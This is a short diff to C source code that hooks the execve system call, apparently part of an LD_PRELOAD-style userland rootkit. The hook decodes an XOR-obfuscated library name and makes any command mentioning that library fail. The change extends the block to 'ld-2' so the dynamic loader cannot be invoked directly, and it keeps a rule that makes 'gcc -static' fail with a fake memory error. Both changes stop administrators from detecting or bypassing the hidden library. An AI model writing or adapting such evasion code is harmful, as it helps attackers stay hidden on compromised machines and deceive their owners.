@@ -323,7 +323,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         char *lib_name = strdup(LIB_NAME); xor(lib_name);
         for(i = 0; argv[i] != NULL; i++)
         {
-            if(strstr(argv[i], lib_name)) // strstr and not strcmp because it could be a full path
+            if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-2")) // strstr and not strcmp because it could be a full path
             {
                 CLEAN(lib_name);
                 errno = EIO;
@@ -338,15 +338,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
     {
         for(i = 0; argv[i] != NULL; i++)
         {
-            if(!strcmp(argv[i], "-static")) // trying to statically compile a binary.. eww
-            {
-                // This works and removes the -static flag from the gcc execution but for some reason gcc throws a "not found error" with an empty string
-                // printf("gcc -static flag detected. overwriting -static flag\n");
-                // strncpy(argv[i], "", strlen(argv[i]));
-                // printf("-static flag overwritten\n");
-                // For now, let's just return a kernel memory error
-                // Sigh...
-
+            if(!strcmp(argv[i], "-static")){
                 errno = ENOMEM;
                 return -1;
             }
